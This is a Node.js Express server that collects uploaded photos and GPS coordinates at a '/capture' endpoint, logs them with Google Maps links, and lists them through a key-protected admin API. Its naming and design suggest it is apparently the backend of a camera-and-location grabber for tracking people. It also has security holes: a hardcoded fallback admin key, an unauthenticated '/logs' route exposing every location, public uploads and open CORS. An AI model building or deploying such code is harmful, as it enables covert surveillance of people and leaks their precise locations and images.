const express = require("express");
const multer = require("multer");
const fs = require("fs");
const mongoose = require("mongoose");
require("dotenv").config();

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

/* =========================
   MONGODB CONNECTION
========================= */
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB error:", err));

/* =========================
   CAPTURE SCHEMA / MODEL
========================= */
const captureSchema = new mongoose.Schema({
  time: { type: Date, default: Date.now },
  latitude: String,
  longitude: String,
  mapLink: String,
  imageFile: String,   // filename stored in /uploads
  imageBase64: String, // base64 fallback for cloud deployments
});

const Capture = mongoose.model("Capture", captureSchema);

/* =========================
   ENSURE UPLOADS FOLDER
========================= */
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

/* =========================
   SERVE STATIC FILES
========================= */
app.use("/uploads", express.static("uploads"));
app.use(express.static("public")); // serve capture.html, admin.html from /public if you want

/* =========================
   MULTER STORAGE CONFIG
========================= */
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, "uploads/"),
  filename: (req, file, cb) => {
    const ext = file.mimetype === "image/png" ? ".png" : ".jpg";
    cb(null, `capture_${Date.now()}${ext}`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB max
  fileFilter: (req, file, cb) => {
    if (file.mimetype === "image/png" || file.mimetype === "image/jpeg") {
      cb(null, true);
    } else {
      cb(new Error("Only PNG and JPEG allowed"));
    }
  }
});

/* =========================
   CORS
========================= */
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Methods", "POST,GET,DELETE,OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

/* =========================
   SERVE PAGES
========================= */
app.get("/admin", (req, res) => {
  res.sendFile(__dirname + "/admin.html");
});

/* =========================
   CAPTURE ROUTE
   Saves to MongoDB + file log
========================= */
app.post("/capture", upload.single("photo"), async (req, res) => {
  const { latitude, longitude } = req.body;
  const hasLocation = latitude && longitude &&
    latitude !== "null" && longitude !== "null";
  const mapLink = hasLocation
    ? `https://www.google.com/maps?q=${latitude},${longitude}`
    : null;
  const imageFile = req.file ? req.file.filename : null;

  try {
    const doc = await Capture.create({
      latitude: hasLocation ? latitude : null,
      longitude: hasLocation ? longitude : null,
      mapLink,
      imageFile,
    });

    // Append to text log as backup
    const log = `
Time: ${new Date().toISOString()}
Latitude: ${latitude || "N/A"}
Longitude: ${longitude || "N/A"}
Google Maps: ${mapLink || "N/A"}
Image File: ${imageFile || "N/A"}
ID: ${doc._id}
-------------------------
`;
    fs.appendFileSync("location-log.txt", log);

    res.status(200).json({ success: true, id: doc._id });
  } catch (err) {
    console.error("Capture error:", err);
    res.status(500).json({ error: "Server error", details: err.message });
  }
});

/* =========================
   VIEW LOGS (text)
========================= */
app.get("/logs", (req, res) => {
  if (!fs.existsSync("location-log.txt")) {
    return res.send("No data captured yet.");
  }
  res.type("text").send(fs.readFileSync("location-log.txt", "utf8"));
});

/* =========================
   ADMIN DATA API  (MongoDB)
   GET /admin-data?key=<ADMIN_KEY>
========================= */
const ADMIN_KEY = process.env.ADMIN_KEY || "aarav12ee";

app.get("/admin-data", async (req, res) => {
  if (req.query.key !== ADMIN_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  try {
    const captures = await Capture.find().sort({ time: -1 }).lean();

    const result = captures.map(c => {
      // Always return the URL if we have a filename — don't block on existsSync
      // (Render has ephemeral FS; file may exist even if not checked)
      const imageUrl = c.imageFile ? `/uploads/${c.imageFile}` : null;

      return {
        id: c._id,
        time: c.time,
        lat: c.latitude,
        lng: c.longitude,
        mapLink: c.mapLink,
        imageUrl,
      };
    });

    res.json(result);
  } catch (err) {
    console.error("Admin data error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

/* =========================
   DELETE CAPTURE
   DELETE /capture/:id?key=<ADMIN_KEY>
========================= */
app.delete("/capture/:id", async (req, res) => {
  if (req.query.key !== ADMIN_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  try {
    const doc = await Capture.findByIdAndDelete(req.params.id);
    if (doc?.imageFile) {
      const path = `uploads/${doc.imageFile}`;
      if (fs.existsSync(path)) fs.unlinkSync(path);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Delete failed" });
  }
});

/* =========================
   SERVER START
========================= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));